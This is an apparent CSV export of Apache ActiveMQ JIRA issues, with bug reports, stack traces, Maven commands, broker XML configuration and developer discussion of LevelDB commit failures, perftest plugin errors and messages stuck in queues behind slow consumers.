        at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)
        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:320)
        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:156)
        at org.apache.maven.cli.MavenCli.execute(MavenCli.java:537)
        at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:196)
        at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
        at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409)
        at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)

After running mvn --debug, I can also see this being generated:

[DEBUG] Configuration: <?xml version=""1.0"" encoding=""UTF-8""?>
<configuration>
  <configDirectory default-value=""${basedir}/src/main/resources/broker-conf"">${${configDirectory}}</configDirectory>
  <configFile>${${configFile}}</configFile>
  <configType default-value=""activemq"">${${configType}}</configType>
  <outputDirectory>${${project.build.directory}}</outputDirectory>
  <url>${${url}}</url>
</configuration>","Ubuntu 12.10
Maven 3.0.4",ceposta,nickspacek,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4466,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,328091,,,Wed May 15 16:30:53 UTC 2013,,,,,,,,,,,"0|i1klw7:",328435,,,,,,,,,,,,,,,,,,,,,"15/May/13 15:27;ceposta;Can you try a 5.9-SNAPSHOT? There were some fixes around the perftest maven plugin especially around running the broker from the perf plugin...

https://issues.apache.org/jira/browse/AMQ-4466;;;","15/May/13 16:20;nickspacek;That works. Is there any chance of it being fixed for the 5.8 branch? We're running into some performance issues in 5.8.0 I had hoped to troubleshoot using the perftest. I will start trying to do so using 5.9-SNAPSHOT, but since we'll likely be going to production with 5.8.0 it would be nice to verify against that version.

Thanks for the suggestion! Is this environment-related somehow, or was it missed in unit testing before the release of 5.8.0?;;;","15/May/13 16:24;ceposta;Probably just missed.. The plugin fixes most likely won't be back-ported.

Well.. when I use the perf plugin, I usually spin up a broker external from the plugin, and usually external from the machine where the perf tests are taking place. That might be a better option? That way you can test against any version of broker you want regardless of what perf plugin version you're using.;;;","15/May/13 16:28;nickspacek;Of course! That's what I'll end up doing too. Thanks for your help.;;;","15/May/13 16:30;ceposta;Cool. No problem!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq configured with leveldb commit fail when accessed by PutGet f-tion from IBM Perf Harness,AMQ-4535,12647495,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,vhubeika,vhubeika,14/May/13 12:19,22/Aug/13 21:37,14/Jul/23 05:43,15/May/13 14:31,5.8.0,,,,,5.9.0,,,Broker,LevelDB,,,0,,,,,,,,,"Poor performance and exceptions thrown when leveldb is configured with activemq while performance is measured with IBM Performance Harness. We use default configuration of activemq except that leveldb is used instead of kahadb. 

Test scenario uses jms.r11.PutGet which sends a message then receives one from the same queue. Normal usage is with correlation identifier to ensure the same message is received.

 Exception thrown by the broker : 

WARN | Store COMMIT FAILED: scala.MatchError: null at org.apache.activemq.leveldb.DelayableUOW.dequeue(DBManager.scala:282) at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.doRemove(LevelDBStore.scala:578) at org.apache.activemq.leveldb.LevelDBStore$Transaction$$anon$3.commit(LevelDBStore.scala:328) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1$$anonfun$apply$10.apply(LevelDBStore.scala:381) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1$$anonfun$apply$10.apply(LevelDBStore.scala:380) at scala.collection.immutable.List.foreach(List.scala:309) at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:32) at scala.collection.mutable.ListBuffer.foreach(ListBuffer.scala:45) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1.apply(LevelDBStore.scala:380) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1.apply(LevelDBStore.scala:379) at org.apache.activemq.leveldb.LevelDBStore.withUow(LevelDBStore.scala:536) at org.apache.activemq.leveldb.LevelDBStore.commit(LevelDBStore.scala:379) at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:263) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:456) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:722) The transaction does not exist


 Exception thrown by the client: 

PutGet1: Uncaught exception. javax.jms.JMSException: STORE COMMIT FAILED: Transaction rolled back. at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1391) at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:748) at org.apache.activemq.TransactionContext.commit(TransactionContext.java:322) at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:561) at com.ibm.uk.hursley.perfharness.jms.r11.PutGet.oneIteration(PutGet.java:97) at com.ibm.uk.hursley.perfharness.WorkerThread.pace(WorkerThread.java:247) at com.ibm.uk.hursley.perfharness.WorkerThread.pace(WorkerThread.java:434) at com.ibm.uk.hursley.perfharness.jms.r11.JMS11WorkerThread.run(JMS11WorkerThread.java:286) at com.ibm.uk.hursley.perfharness.jms.r11.PutGet.run(PutGet.java:86) Caused by: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back. at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:77) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:263) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:456) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:722) Caused by: java.lang.Throwable: scala.MatchError: null at org.apache.activemq.leveldb.DelayableUOW.dequeue(DBManager.scala:282) at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.doRemove(LevelDBStore.scala:578) at org.apache.activemq.leveldb.LevelDBStore$Transaction$$anon$3.commit(LevelDBStore.scala:328) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1$$anonfun$apply$10.apply(LevelDBStore.scala:381) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1$$anonfun$apply$10.apply(LevelDBStore.scala:380) at scala.collection.immutable.List.foreach(List.scala:309) at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:32) at scala.collection.mutable.ListBuffer.foreach(ListBuffer.scala:45) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1.apply(LevelDBStore.scala:380) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1.apply(LevelDBStore.scala:379) at org.apache.activemq.leveldb.LevelDBStore.withUow(LevelDBStore.scala:536) at org.apache.activemq.leveldb.LevelDBStore.commit(LevelDBStore.scala:379) at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72) ... 13 more PutGet8: STOP


 After the test finished, we had several messages left in queues. We tried to read them with a different client and not in all cases we succeeded. However, after the broker restart, we could read the rest of messages. 

Our results for performance testing can be found at http://wiki.test.redhat.com/MRG/Messaging/PerformanceTesting/releases/m26_m29 ",RHEL 6.4,vhubeika,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4485,,,,,,,,"16/May/13 07:57;vhubeika;IBMPH.out;https://issues.apache.org/jira/secure/attachment/12583448/IBMPH.out","16/May/13 07:57;vhubeika;activemq.log;https://issues.apache.org/jira/secure/attachment/12583449/activemq.log","14/May/13 14:29;vhubeika;activemq.xml;https://issues.apache.org/jira/secure/attachment/12583130/activemq.xml","14/May/13 14:29;vhubeika;amq_test_reproducer.sh;https://issues.apache.org/jira/secure/attachment/12583129/amq_test_reproducer.sh",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,327851,,,Thu May 16 07:57:14 UTC 2013,,,,,,,,,,,"0|i1kkev:",328195,,,,,,,,,,,,,,,,,,,,,"14/May/13 13:57;chirino;Hi, do you have some way for us to reproduce the usage scenario you were executing?;;;","14/May/13 14:29;vhubeika;To run the reproducer:
 0. Start broker with default settings except that leveldb should be configured instead of kahadb
 1. edit the script and change the IP to the one where broker is running. (You may also want to comment out some interrations in the script.)
 2. create in the same directory a directory called perfharness containing IBM Perf Harness files
 3. start a scripts as ./amq_test_reproducer.sh AMQ_DIR

AMQ_DIR should contain activemq-all-5.8.0.jar;;;","15/May/13 14:31;chirino;Fixed in trunk.  Thanks for the bug report!;;;","16/May/13 07:57;vhubeika;Hi,

here are the logs from the long test

in the end the whole test hangs

Kind Regards,
Valiantsina Hubeika
MRG Associate Quality Engineer
Red Hat Czech s.r.o., Purkynova 99/71, 612 45 Brno, Czech Republic
 

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
When using ElectingLevelDBStore cannot delete all messages on startup,AMQ-4534,12647440,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,ceposta,ceposta,ceposta,14/May/13 03:36,14/May/13 03:38,14/Jul/23 05:43,14/May/13 03:38,5.9.0,,,,,,,,LevelDB,,,,0,,,,,,,,,"Cannot call BrokerService#deleteAllMessages() nor setDeleteAllMessagesOnStartup() when using ElectingLevelDBStore... this is because the elector has not yet been run, and is null. Simple solution is override it (like a handful of other methods that are not intended to be called without having an elected master) and give it a default behavior. ",,ceposta,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,327796,,,Tue May 14 03:38:01 UTC 2013,,,,,,,,,,,"0|i1kk2n:",328140,,,,,,,,,,,,,,,,,,,,,"14/May/13 03:38;ceposta;Fixed w/ r1482180;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Messages stuck in queue with redelivered=true,AMQ-4533,12647406,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,jshepher,jshepher,13/May/13 23:39,21/Mar/14 12:42,14/Jul/23 05:43,21/Mar/14 12:42,5.7.0,,,,,5.10.0,,,JMS client,,,,1,,,,,,,,,"We're  getting message stuck in queues with the 
redelivery flag set to true.

We used the following test model: put every 1 second 50 messages sequentially, and after that, the rest of 1000 msgs quickly to INPUT_QUEUE and 
while starting 25 listeners cosuming from INPUT_QUEUE, which takes about 30 seconds to move the message to RECEIPT_QUEUE, 10 other listeners on RECEIPT_QUEUE consume and counts them.

We tried making one of the consumer slow by setting the 
processing time to 100000 seconds (sleep) and putting a heavy load in 
500 threads every 1 ms to some other queues the same time.

Our test case is attached, you might need to install some dependencies 
to the local maven repository manually:

     mvn install:install-file -DgroupId=org.apache.activemq 
-DartifactId=activemq-core -Dversion=5.7.0-fuse-71-047 -Dpackaging=jar 
-Dfile=activemq-core-5.7.0.fuse-71-047.jar
     mvn install:install-file -DgroupId=org.apache.kahadb 
-DartifactId=kahadb -Dversion=5.7.0-fuse-71-047 -Dpackaging=jar 
-Dfile=kahadb-5.7.0.fuse-71-047.jar
     mvn install:install-file 
-DgroupId=org.apache.geronimo.management.specs 
-DartifactId=geronimo-j2ee-management_1.1_spec -Dversion=1.0.1 
-Dpackaging=jar -Dfile=geronimo-j2ee-management_1.1_spec-1.0.1.jar
     mvn install:install-file -DgroupId=org.apache.activemq.pool 
-DartifactId=activemq-pool -Dversion=5.7.0-fuse-71-047 -Dpackaging=jar 
-Dfile=activemq-pool-5.7.0.fuse-71-047.jar

To run the test, simply use the Maven test target:

    mvn clean test

If the problem occurs the you'll get a message like this in the test 
results, (target/surefire-reports):

    java.lang.AssertionError: Still messages in InputQueue expected:<0> 
but was:<365>
",Fuse Message Broker 5.7.0,adenysenko,dejanb,donnchadh,gtully,jshepher,tabish,wdudek,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4621,,,,,,,,,,,,,,,,"13/Sep/13 18:06;tabish;AMQ4533-Test.patch;https://issues.apache.org/jira/secure/attachment/12603065/AMQ4533-Test.patch","12/Sep/13 22:33;tabish;AMQ4533-Test.patch;https://issues.apache.org/jira/secure/attachment/12602893/AMQ4533-Test.patch","11/Sep/13 22:59;tabish;AMQ4533-Test.patch;https://issues.apache.org/jira/secure/attachment/12602697/AMQ4533-Test.patch","10/Sep/13 21:42;tabish;AMQ4533-Test.patch;https://issues.apache.org/jira/secure/attachment/12602428/AMQ4533-Test.patch","10/Sep/13 20:45;tabish;AMQ4533-Test.patch;https://issues.apache.org/jira/secure/attachment/12602411/AMQ4533-Test.patch","16/Sep/13 22:52;tabish;AMQ4533-test.patch;https://issues.apache.org/jira/secure/attachment/12603477/AMQ4533-test.patch","21/Jun/13 13:49;gtully;AMQ4533Test.java;https://issues.apache.org/jira/secure/attachment/12589062/AMQ4533Test.java","10/Jun/13 17:35;tabish;AMQ4533TestPatch.txt;https://issues.apache.org/jira/secure/attachment/12587104/AMQ4533TestPatch.txt","31/May/13 20:04;tabish;AMQ4533TestPatch.txt;https://issues.apache.org/jira/secure/attachment/12585659/AMQ4533TestPatch.txt","29/May/13 18:31;tabish;AMQ4533TestPatch.txt;https://issues.apache.org/jira/secure/attachment/12585272/AMQ4533TestPatch.txt","09/Sep/13 10:28;wdudek;AMQ4533_logs.ZIP;https://issues.apache.org/jira/secure/attachment/12602115/AMQ4533_logs.ZIP","11/Sep/13 14:19;wdudek;AMQFreezeFailingTest.zip;https://issues.apache.org/jira/secure/attachment/12602590/AMQFreezeFailingTest.zip","18/Sep/13 16:22;wdudek;AMQFreezeTest-5.8.0.fuse-72-SNAPSHOT-log.zip;https://issues.apache.org/jira/secure/attachment/12603856/AMQFreezeTest-5.8.0.fuse-72-SNAPSHOT-log.zip","18/Sep/13 16:22;wdudek;AMQFreezeTest-5.9.0.redhat-610084-log.zip;https://issues.apache.org/jira/secure/attachment/12603857/AMQFreezeTest-5.9.0.redhat-610084-log.zip","16/Sep/13 15:26;dejanb;AMQFreezeTest.patch;https://issues.apache.org/jira/secure/attachment/12603352/AMQFreezeTest.patch","18/Sep/13 14:36;dejanb;AMQFreezeTest.zip;https://issues.apache.org/jira/secure/attachment/12603834/AMQFreezeTest.zip","09/Sep/13 10:33;wdudek;AMQFreezeTest.zip;https://issues.apache.org/jira/secure/attachment/12602116/AMQFreezeTest.zip","09/Sep/13 10:34;wdudek;AMQFreeze_logs.zip;https://issues.apache.org/jira/secure/attachment/12602117/AMQFreeze_logs.zip","23/Sep/13 10:34;wdudek;LOGS_FAILED_5.9.0.redhat-610-SNAPSHOT.zip;https://issues.apache.org/jira/secure/attachment/12604553/LOGS_FAILED_5.9.0.redhat-610-SNAPSHOT.zip","23/May/13 01:22;jshepher;kahaPendingMessages.zip;https://issues.apache.org/jira/secure/attachment/12584422/kahaPendingMessages.zip",,20.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,327762,,,Fri Mar 21 12:42:49 UTC 2014,,,,,,,,,,,"0|i1kjv3:",328106,,,,,,,,,,,,,,,,,,,,,"13/May/13 23:56;ceposta;You may have forgotten to attach the test case?;;;","14/May/13 00:30;jshepher;Thanks Christian, I've attached it now.;;;","14/May/13 18:30;tabish;Note: Test is using the depricated and removed amqPersistenceAdapter so it'll need an update if run against newer broker releases.  ;;;","23/May/13 01:22;jshepher;Testcase updated to use KahaDB;;;","29/May/13 18:31;tabish;Initial cut of a thinned down version of this test as a JUnit test.  The test is pretty complex so we need to try and reduce it down as much as we can to aid debugging the issue. ;;;","31/May/13 20:04;tabish;some more cleanups to reduce the code size of this test.;;;","31/May/13 20:05;tabish;Its not clear to me that this really shows an issue.  At the time the zero sized Queue assertions are issued there are still threads producing and consuming from these Queues so I don't see how the test can work.  Perhaps you can clean it up a bit and reduce the amount of things going on here, tests takes 30 minutes or more on my machine.  ;;;","05/Jun/13 00:07;jshepher;This reproducer is basically a reproduction of a production scenario, and it needs to be like this, because its the only way we've found to replication the issue. If we break down what happens in the test case, hopefully you'll understand why we need so many things going on.

Step 2 in the test case is critial for reproducing the problem. It simulates slow cusomer, with threads hung, or a slow database operation. Without this slow consumer, the test completes very fast, and we don't see the problem. 

The test simulates the production environment where the broker is under heavy load. In the test case there is heavy load on SOME_TEST_QUEUE, all of which uses separate connections pools, message listeners, and latches. Whereas the critical messages for the test case are on INPUT_QUEUE, and RECEIPT_QUEUE, which use OtherMessageListener, and onOtherMessageLatch.

This test case is the only evidence of a problem which has been plaguing our production environment for years.

Here is how the TC works:

1) start AMQ brokers

2) start spring consumer for consumming from INPUT_QUEUE and putting receipts to RECEIPT_QUEUE
This consumer is processing first message for ever.
	   if (isStuckOld!=isStuck) {
	        log4jLogger.info(""sleep for eternity"");
	        Thread.sleep(100000000);
                 }	
and next 49 messages longer /30 seconds/ than rest of 1000 msgs.

	if (nrProcessed<50) {
			Thread.sleep(30000);
	}

The reason for it is to simulate some slow & stuck consumers which we can notice on production.

3) run heavy traffic to SOME.TEST.QUEUE 
a) put 1000000 messages using 50 threads to broker 1

sendInThreads(QUEUE_NAME, 500000, 50, DeliveryMode.NON_PERSISTENT,getUrl1(),1);
sendInThreads(QUEUE_NAME, 500000, 50, DeliveryMode.PERSISTENT,getUrl1(),1);

b) get 900000 messages in 200 listening threads from broker 2 using OtherMessageListener

listenInThreads(QUEUE_NAME, 900000, 200,getUrl2(), mListener, otherConnections);

However we do not wait on latches as it is not important. This is traffic to simulate heavy load only - not necessary to count them.

4) send traffic to INPUT_QUEUE in 10 threads on broker 1 which triggers our spring consumer from step 2 to start consuming and to send output messages to RECEIPT_QUEUE /one receipt message sent to RECEIPT_QUEUE for one message consumed from INPUT_QUEUE/.

        	CountDownLatch latch1=sendInThreads(queueName, msgCount, threadCount, persistance,getUrl1(),500);

The latch1 is checked later in the step 6 to ensure we had all 1000 messages sent there.

5) listen on RECEIPT_QUEUE in 10 threads on broker 2 using MainMessageListener with onMainMessageLatch set to 999 /one message should be stuck on consummer forever by TC design/

            CountDownLatch latch=listenInThreads(queueName, msgCount, threadCount,getUrl2(),msgListener,connections);

6) wait for latches - because of heavy load we had to set the timeout long enough /here 1000 seconds/ to give the system the chance to process all messages from INPUT_QUEUE /the processing might be very slow because of heavy load/
			onMainMessageLatch.await(1000, TimeUnit.SECONDS);
and also we check if all messages were put into INPUT_QUEUE for processing
			latch1.await(msgCount/10, TimeUnit.SECONDS); // .MINUTES

7) check assertions for INPUT_QUEUE and RECEIPT_QUEUE - they should be empty

		    queueName = INPUT_QUEUE;
            
            queueSize1=queueSize(brokerService1, queueName);
            queueSize2=queueSize(brokerService2, queueName);            
            
            Assert.assertEquals(""Still messages in ""+queueName,0, queueSize1+queueSize2);
			
		    queueName = RECEIPT_QUEUE;
            
            queueSize1=queueSize(brokerService1, queueName);
            queueSize2=queueSize(brokerService2, queueName);            
            
            Assert.assertEquals(""Still messages in ""+queueName,0, queueSize1+queueSize2);			


8) close AMQ brokers
;;;","10/Jun/13 17:35;tabish;more cleanups inside the test, less spring dependence. ;;;","12/Jun/13 15:54;gtully;from the current test case (as updated by tim) the queue depth matches the inflight count due to messages prefetched by the consumer that waits for ever. 
This is expected. Until the waitingForever consumer closes, prefetched messages will not be consumable. Using a prefetch of 0, so making the consumers pull messages on demand will resolve this.

In the production env, does the destination with unexpected queue depth have an inflight value that matches when viewed via jmx?;;;","17/Jun/13 15:46;wdudek;It might not be acceptable by customers when the app performance decreases. However if that is the case I wonder if there is any other possibility to timeout some poisoned consumer and redirect all the prefetched messages to the rest of the consumers or, at least, to deliver next messages to the fast and operational consumers to avoid the msgs stuck into invalid one. Also could you create a modified version of this test case to prove that the prefetchSize=0 will solve the issue at the cost of performance degradation in processing of messages?;;;","18/Jun/13 06:05;jshepher;In the sendAndListenToWithFailower method, you call listenInThreads with 'ReceiptQueue' as the queueName. If you only wanted to set the prefetch on ReceiptQueue, you would need to refactor the sendAndListenToWithFailower method to be able to specifying the prefetch value to pass to the registerConsumerListeners methods. 

In that method, you could pass the prefetch. So instead of :

            MessageConsumer messageConsumer = session.createConsumer(                           
                    session.createQueue(queueName));

You could use something like:

            queue = new ActiveMQQueue(queueName + ""?consumer.prefetchSize=0"");
            MessageConsumer messageConsumer = session.createConsumer(queue)

See this page for a reference:

   http://activemq.apache.org/what-is-the-prefetch-limit-for.html

;;;","18/Jun/13 08:47;wdudek;Yes, I did but it does not work. It is illegal to set prefetch to 0 and set message listener. Could someone create working TC to prove the theory? However we will still need some mechanism to timeout poisoned consumer to move prefetch messages to others. I would like to ensure that the test case is working without setting prefetch value to 0 and even with 1000 messages blocked at one consumer for some limited or unlimited time we have the next thousands of messages flowing to other consumers. 
;;;","18/Jun/13 09:54;gtully;Prefetch 1 is the best you can do with a listener. 
Have a look athttp://activemq.2283324.n4.nabble.com/Finding-a-slow-consumer-td4654153.html to see some detail on the abort slow consumer policy. That will ensure that stuck prefetched messages get re dispatched. ;;;","18/Jun/13 10:01;gtully;Some additional doc at https://access.redhat.com/site/documentation/en-US/JBoss_A-MQ/6.0/html/Tuning_Guide/files/TuningSlowConsumers.html;;;","19/Jun/13 11:57;wdudek;Here is what I tried to put into spring2.xml & spring3.xml but we still have e.g. 400 messages stuck. I checked a few possible configurations for <abortSlowConsumerStrategy> and the test case is still failing.

<destinationPolicy>
  <policyMap>
    <policyEntries>
       <policyEntry queue="">"" producerFlowControl=""true"" memoryLimit=""10mb"">
          <slowConsumerStrategy>
	     <abortSlowConsumerStrategy abortConnection=""true"" maxSlowDuration=""30000"" />
	  </slowConsumerStrategy>
	</policyEntry>
    </policyEntries>
  </policyMap>
</destinationPolicy>
;;;","21/Jun/13 13:49;gtully;adding the abort slow consumer policy to the input queue and setting prefetch to 10.

The prefetch is relevant b/c there are multiple consumers so messages get loadbalanced across them.
To be deemed slow, a consumer must have a dispatch size > than the prefetch for more than 30s and with prefetch 1000 (Default) this was not happening b/c all other consumers were very fast.;;;","21/Jun/13 13:50;gtully;note also that in the test, autack is used, so the message that ""sleeps for eternity"" is acked before the sleep but there is no receipt.;;;","21/Jun/13 15:40;wdudek;Thank you Gary for your input but apart from the fact this might be unacceptable to decrease the performance by reducing prefetchSize from 1000 to 10 I am not sure if it is going to work. It is still failing on my local machine and anyway it might happen that we need wait a long time to have full prefetch queue /1000 messages assigned to “stuck” consumer/ to be released. We could tune the prefetch for every queue but anyway we might really need some good working timeout for aborting such consumers /to release all prefetched messages to it/. For now the timeout is related to slow consumers only and depends on difficult mechanism of slowness detecting which does not work if there are not enough messages coming to a queue for some time. So most likely it is still necessary to have a new checking mechanism whether a consumer is still consuming messages or not. ;;;","21/Jun/13 16:06;gtully;However, if there are very few messages and lots of consumers, using a prefetch > 0 will not have much impact. Prefetch is really only beneficial when consumers are very fast and when there are lots of messages in the queue or many producers. When consumers take a long or variable amount of time, it is best to leave the messages in the queue (prefecth=1) for other consumers to access.

ok, we may need to make the slowness determination some sort of strategy.
Have a thought on how best to determine the 'slowness"" of a consumer, maye time since last ack. 
It needs to a fast calculation. The decision to dispatch based on prefetch was already firing an advisory for a slow consumer so that was reused for the current abort policy. 

I would be interested to know if you can get the test to fail with a prefetch=1, also note that just the consumer is aborted, not the connection, abortConnection=false (Default);;;","25/Jun/13 09:27;wdudek;The test case has passed for AMQ v.5.8.0 after setting the prefetchSize to 10 and abortSlowConsumerStrategy as follows:  
          <policyEntry queue="">"" producerFlowControl=""true"" memoryLimit=""10mb"" queuePrefetch=""10"" >
		<slowConsumerStrategy>
			<abortSlowConsumerStrategy/>
		</slowConsumerStrategy>
	   </policyEntry>		  
I agree that the ""time since last ack"" would be good enough.;;;","05/Jul/13 13:23;tabish;Would be good to close this out as resolved and create an enhancement issue documenting the needed improvements to cover this use case so it can get added into the road map.;;;","05/Jul/13 20:19;gtully;Raised https://issues.apache.org/jira/browse/AMQ-4621 to track the enhancement to the abort policy to be more deterministic.;;;","09/Sep/13 10:25;wdudek;It seems that the issue has not been resolved yet by introducing the timeout in AMQ-4621. See the logs from failed TC. We have another test case AMQFreeze which fails even the timeout is set using SlowAckConsumerStrategy. I attached the new TC. We should reopen AMQ-4533.;;;","09/Sep/13 10:28;wdudek;DEBUG logs for failed TC AMQ4533 ;;;","09/Sep/13 10:33;wdudek;New AMQ ""freeze"" test case;;;","09/Sep/13 10:34;wdudek;logs from failed AMQFreezeTest;;;","10/Sep/13 15:35;tabish;After some additional work on 4621 yesterday the problem seems to be back to not dispatching.  Broker 2 now has some messages left in the Queue that aren't being dispatched.  ;;;","10/Sep/13 20:45;tabish;Freeze test cleaned up a bit and in the form of a patch for easier application.;;;","10/Sep/13 21:42;tabish;Updated to collect some more data in the logs.;;;","11/Sep/13 13:00;wdudek;During my testing today the 5.9.0.redhat-610067 resolved the AMQ4533(kahaPendingMessages) test case using 
<abortSlowAckConsumerStrategy maxSlowCount=""1""/> and when put enough time to consume all messages by adding Thread.sleep(30);  before checking the queue sizes                                  
but after adding abortConnection=""true"" e.g. <abortSlowAckConsumerStrategy maxSlowCount=""1"" abortConnection=""true""/> the TC is failing again.

So abortConnection=""true"" is not working and AMQ cannot force the consumer connections to close but only can ask them gently to be closed. 
For kahaPendingMessages TC it is enough because the consumer thread is in a good state /only too busy to process other messages/ 
but for another test case (AMQFreezeTest) it is not enough because being interrupted the consumers connections are in wrong state and do not react on the close request from AMQ broker /I guess/.
For the second test case the abortConnection=""true"" is necessary and for my opinion it is why the second test case is still failing.
